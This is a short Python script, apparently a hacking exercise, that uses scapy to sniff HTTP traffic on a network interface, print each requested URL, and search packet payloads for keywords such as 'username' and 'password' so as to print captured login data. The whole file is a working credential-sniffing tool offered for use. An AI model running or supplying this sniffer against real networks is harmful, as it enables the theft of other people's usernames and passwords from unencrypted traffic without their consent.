#!/usr/bin/env python

import scapy.all as scapy
# Requirements pip install scapy_http
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')  # Ensure proper decoding
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.lower() in load.lower():  # Case-insensitive matching
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


sniff("eth0")  # Adjust the interface as per your system
